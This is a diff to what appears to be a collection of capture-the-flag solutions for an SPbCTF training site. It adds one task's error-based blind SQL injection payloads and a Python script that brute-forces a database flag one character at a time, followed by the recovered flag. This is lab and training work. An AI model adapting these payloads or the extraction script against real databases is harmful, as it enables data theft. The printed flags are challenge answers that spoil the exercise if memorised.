@@ -1424,3 +1424,34 @@ IF(ASCII(SUBSTR((SELECT flag FROM flag),20,1))=125, POW(9,999), 0)
 ->
 
 spbctf{0h_noo_3rr0r}
+
+62) http://kslweb1.spb.ctf.su/sqli/error2/?
+
+IF(LENGTH((SELECT flag FROM flag))=114, POW(9,999), 0)
+IF(ASCII(SUBSTR((SELECT flag FROM flag),1,1))=115, POW(9,999), 0)
+
+---
+
+import requests
+import base64
+
+def main():
+    for pos in range(1, 114):
+        for symbol in range(33, 126):
+            query = f'IF(ASCII(SUBSTR((SELECT flag FROM flag),{pos},1))={symbol}, POW(9,999), 0)'
+            sig_query = base64.b64encode(query.encode())
+
+            payload = {"query": query, "sig_query": sig_query}
+            r = requests.get(f'http://kslweb1.spb.ctf.su/sqli/error2', params=payload)
+
+            if len(r.text) != 5660:
+                print(chr(symbol), end='')
+                break
+
+if __name__ == '__main__':
+    main()
+
+---
+
+spbctf{0h_h3r3_w3_g0_4g4in__but_w41t_it_s_too_long_c4n_i_f37ch_17_all__pl3453_st0p_wr1t1ng_such_r4nd0m_w0rd5_here}
+
